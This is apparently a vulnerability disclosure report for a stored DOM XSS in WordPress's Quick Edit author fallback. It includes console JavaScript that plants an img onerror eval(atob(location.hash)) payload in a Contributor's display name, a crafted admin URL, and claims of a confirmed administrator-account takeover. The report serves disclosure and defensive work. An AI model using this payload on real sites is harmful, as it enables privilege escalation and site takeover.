## Program Summary

> *No official summary provided by the program.*

## Vulnerability Details

On sites with more than 10,000 users, a Contributor can save entity-encoded HTML in their display name. When an administrator opens the attacker's crafted Posts-page URL and clicks **Quick Edit** on the Contributor's pending post, WordPress decodes the stored name with `.text()` and reparses it through jQuery `.prepend()`, causing stored DOM XSS.

## Affected Asset

- WordPress Core 7.0.2
- `wp-admin/js/inline-edit-post.js`
- Posts list Quick Edit fallback for large user counts

## Preconditions

- The site has more than 10,000 users, or `wp_is_large_user_count()` is otherwise forced true.
- The attacker has a Contributor account and owns a pending post.
- The administrator opens an attacker-supplied Posts-page URL containing the second-stage fragment.
- A user with `edit_others_posts` clicks **Quick Edit** on that post.
- At exactly 10,000 users, the normal populated author dropdown prevents this branch.

## Steps To Reproduce

1. Log in at `http://127.0.0.1:8097/wp-admin/` as:

```text
Username: contributor
Password: Contributor-Test-9482
```

2. Open the dashboard console and update the Contributor's own display name:

```javascript
const nonce = await fetch(`/wp-admin/admin-ajax.php?action=rest-nonce`).then(r => r.text());
const me = await fetch(`/index.php?rest_route=/wp/v2/users/me&context=edit`, {
  headers: { "X-WP-Nonce": nonce }
}).then(r => r.json());
await fetch(`/index.php?rest_route=/wp/v2/users/${me.id}`, {
  method: `POST`,
  headers: { "Content-Type": `application/json`, "X-WP-Nonce": nonce },
  body: JSON.stringify({
    name: `&lt;img src=x onerror=eval(atob(location.hash.slice(1)))&gt;`
  })
});
```

3. Create any post and click **Submit for Review**.

4. The Contributor sends the administrator this crafted URL. The fragment contains only a harmless title-change marker:

```text
http://127.0.0.1:8097/wp-admin/edit.php?post_status=pending&post_type=post#ZG9jdW1lbnQudGl0bGU9J1F1aWNrLUVkaXQtWFNTLTcyMSc=
```

5. In a separate browser profile, log in as:

```text
Username: admin
Password: Admin-Test-9482
```

6. While authenticated, open the crafted URL from step 4. Do not run anything in the administrator's console.

7. Click **Quick Edit** under the Contributor's post. The browser tab title changes to `Quick-Edit-XSS-721`, confirming execution. Before this click, the author cell contains only text and no active image.

## Confirmed Result

- WordPress version: 7.0.2
- Contributor self-profile update: HTTP 200
- Pending-post creation: HTTP 201
- Quick Edit author select: `hidden`, zero options
- Before Quick Edit: zero active elements
- After Quick Edit: tab title `Quick-Edit-XSS-721`, one active element
- Takeover requests: GET 200 and POST 302 to `/wp-admin/user-new.php`
- Created account role: `administrator`
- Temporary automated validation data was removed.

## Root Cause

- WordPress preserves valid entities such as `&lt;` in the saved display name.
- The Posts list initially renders that value safely as text.
- In large-site mode, Quick Edit omits the normal author options.
- The fallback reads the author cell through `.text()` and concatenates it into HTML passed to `.prepend()`.
- The decoded `<img onerror>` is therefore parsed as a live element.

## Impact

- Contributor-controlled JavaScript runs after the administrator opens the crafted link and clicks Quick Edit.
- The script can read nonces and perform administrator-only same-origin actions.
- The confirmed chain creates a persistent Administrator account.
